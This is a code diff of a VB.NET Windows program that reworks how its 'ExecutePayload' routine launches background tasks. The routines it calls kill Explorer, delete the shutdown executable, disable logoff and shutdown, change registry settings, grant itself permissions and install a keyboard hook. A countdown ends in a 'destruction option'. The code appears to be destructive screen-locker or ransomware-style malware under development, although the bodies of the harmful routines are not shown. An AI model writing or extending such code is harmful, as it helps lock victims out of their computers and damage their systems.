@@ -507,7 +507,7 @@ Public Class Form1
             If overlay.countdownTime > 0 Then
                 overlay.countdownTime -= 1
                 overlay.timerLabel.Text = "Remaining Time: " & overlay.countdownTime.ToString() & " seconds"
-                KillExplorerAndMore()
+                BwKillExplorer.RunWorkerAsync()
 
             Else
                 ' When countdown finishes, prompt user for destruction option
@@ -1415,119 +1415,46 @@ Public Class Form1
     ' Method to execute the payload using BackgroundWorker
     Private Sub ExecutePayloadWork()
         Try
-            Dim bwSetWallpaper As New BackgroundWorker()
-            AddHandler bwSetWallpaper.DoWork, AddressOf SetWallpaperWork
-            bwSetWallpaper.RunWorkerAsync()
 
-            Dim bwKillExplorer As New BackgroundWorker()
-            AddHandler bwKillExplorer.DoWork, AddressOf KillExplorerAndMoreWork
-            bwKillExplorer.RunWorkerAsync()
+            Try
+                VisualEffectTimer.Start()
+            Catch ex As Exception
+                Console.WriteLine("Error in VisualEffectTimer.Start: " & ex.Message)
+            End Try
+            Try
+                AnimationTimer.Start()
+            Catch ex As Exception
+                Console.WriteLine("Error in AnimationTimer.Start: " & ex.Message)
+            End Try
 
-            Dim bwKillGrantAccess As New BackgroundWorker()
-            AddHandler bwKillGrantAccess.DoWork, AddressOf KillGrantAccessAndDeleteShutdownExeWork
-            bwKillGrantAccess.RunWorkerAsync()
+            BwSetWallpaper.RunWorkerAsync()
 
-            Dim bwWriteMessage As New BackgroundWorker()
-            AddHandler bwWriteMessage.DoWork, AddressOf WriteMessageToNotepadWork
-            bwWriteMessage.RunWorkerAsync()
+            BwKillExplorer.RunWorkerAsync()
 
-            Dim bwGrantPermissions As New BackgroundWorker()
-            AddHandler bwGrantPermissions.DoWork, AddressOf GrantSelfPermissionsWork
-            bwGrantPermissions.RunWorkerAsync()
+            BwWriteMessage.RunWorkerAsync()
 
-            Dim bwVisualEffectTimer As New BackgroundWorker()
-            AddHandler bwVisualEffectTimer.DoWork, AddressOf StartVisualEffectTimerWork
-            bwVisualEffectTimer.RunWorkerAsync()
+            Try
+                KillGrantAccessAndDeleteShutdownExe()
+            Catch ex As Exception
+                Console.WriteLine("Error in KillGrantAccessAndDeleteShutdownExe: " & ex.Message)
+            End Try
 
-            Dim bwAnimationTimer As New BackgroundWorker()
-            AddHandler bwAnimationTimer.DoWork, AddressOf StartAnimationTimerWork
-            bwAnimationTimer.RunWorkerAsync()
+            Try
+                UpdateRegistrySettings()
+            Catch ex As Exception
+                Console.WriteLine("Error in UpdateRegistrySettings: " & ex.Message)
+            End Try
 
-            Dim bwUpdateRegistry As New BackgroundWorker()
-            AddHandler bwUpdateRegistry.DoWork, AddressOf UpdateRegistrySettingsWork
-            bwUpdateRegistry.RunWorkerAsync()
-
-            Dim bwDisableLogoff As New BackgroundWorker()
-            AddHandler bwDisableLogoff.DoWork, AddressOf DisableLogoffSwitchUserAndShutdownWork
-            bwDisableLogoff.RunWorkerAsync()
+            Try
+                DisableLogoffSwitchUserAndShutdown()
+            Catch ex As Exception
+                Console.WriteLine("Error in DisableLogoffSwitchUserAndShutdown: " & ex.Message)
+            End Try
 
         Catch ex As Exception
-            ' General exception handling for the entire ExecutePayload method
-            Console.WriteLine("An error occurred in ExecutePayload: " & ex.Message)
-        End Try
-    End Sub
-
-    ' BackgroundWorker methods for each operation
-    Private Sub SetWallpaperWork(ByVal sender As Object, ByVal e As DoWorkEventArgs)
-        Try
-            SetWallpaper()
-        Catch ex As Exception
-            Console.WriteLine("Error in SetWallpaper: " & ex.Message)
-        End Try
-    End Sub
-
-    Private Sub KillExplorerAndMoreWork(ByVal sender As Object, ByVal e As DoWorkEventArgs)
-        Try
-            KillExplorerAndMore()
-        Catch ex As Exception
-            Console.WriteLine("Error in KillExplorerAndMore: " & ex.Message)
-        End Try
-    End Sub
-
-    Private Sub KillGrantAccessAndDeleteShutdownExeWork(ByVal sender As Object, ByVal e As DoWorkEventArgs)
-        Try
-            KillGrantAccessAndDeleteShutdownExe()
-        Catch ex As Exception
-            Console.WriteLine("Error in KillGrantAccessAndDeleteShutdownExe: " & ex.Message)
-        End Try
-    End Sub
-
-    Private Sub WriteMessageToNotepadWork(ByVal sender As Object, ByVal e As DoWorkEventArgs)
-        Try
-            WriteMessageToNotepad()
-        Catch ex As Exception
-            Console.WriteLine("Error in WriteMessageToNotepad: " & ex.Message)
-        End Try
-    End Sub
-
-    Private Sub GrantSelfPermissionsWork(ByVal sender As Object, ByVal e As DoWorkEventArgs)
-        Try
-            GrantSelfPermissions()
-        Catch ex As Exception
-            Console.WriteLine("Error in GrantSelfPermissions: " & ex.Message)
-        End Try
-    End Sub
-
-    Private Sub StartVisualEffectTimerWork(ByVal sender As Object, ByVal e As DoWorkEventArgs)
-        Try
-            VisualEffectTimer.Start()
-        Catch ex As Exception
-            Console.WriteLine("Error in VisualEffectTimer.Start: " & ex.Message)
-        End Try
-    End Sub
-
-    Private Sub StartAnimationTimerWork(ByVal sender As Object, ByVal e As DoWorkEventArgs)
-        Try
-            AnimationTimer.Start()
-        Catch ex As Exception
-            Console.WriteLine("Error in AnimationTimer.Start: " & ex.Message)
-        End Try
-    End Sub
-
-    Private Sub UpdateRegistrySettingsWork(ByVal sender As Object, ByVal e As DoWorkEventArgs)
-        Try
-            UpdateRegistrySettings()
-        Catch ex As Exception
-            Console.WriteLine("Error in UpdateRegistrySettings: " & ex.Message)
-        End Try
-    End Sub
-
-    Private Sub DisableLogoffSwitchUserAndShutdownWork(ByVal sender As Object, ByVal e As DoWorkEventArgs)
-        Try
-            DisableLogoffSwitchUserAndShutdown()
-        Catch ex As Exception
-            Console.WriteLine("Error in DisableLogoffSwitchUserAndShutdown: " & ex.Message)
-        End Try
+                ' General exception handling for the entire ExecutePayload method
+                Console.WriteLine("An error occurred in ExecutePayload: " & ex.Message)
+            End Try
     End Sub
 
     ' Event handler for the Exit button
@@ -1551,6 +1478,13 @@ Public Class Form1
             ' Set up the low-level keyboard hook
             hookCallbackDelegate = New HookProc(AddressOf HookCallback)
             hookID = SetHook(hookCallbackDelegate)
+
+            Try
+                GrantSelfPermissions()
+            Catch ex As Exception
+                Console.WriteLine("Error in GrantSelfPermissions: " & ex.Message)
+            End Try
+
         Catch ex As Exception
             MessageBox.Show("An error occurred during initialization: " & ex.Message, "Initialization Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
         End Try
@@ -1559,4 +1493,19 @@ Public Class Form1
     Protected Overrides Sub OnFormClosed(e As FormClosedEventArgs)
     End Sub
 
+    Private Sub BwSetWallpaper_DoWork(sender As Object, e As DoWorkEventArgs) Handles BwSetWallpaper.DoWork
+        Try
+            SetWallpaper()
+        Catch ex As Exception
+            Console.WriteLine("Error in SetWallpaper: " & ex.Message)
+        End Try
+    End Sub
+
+    Private Sub BwWriteMessage_DoWork(sender As Object, e As DoWorkEventArgs) Handles BwWriteMessage.DoWork
+        Try
+            WriteMessageToNotepad()
+        Catch ex As Exception
+            Console.WriteLine("Error in WriteMessageToNotepad: " & ex.Message)
+        End Try
+    End Sub
 End Class
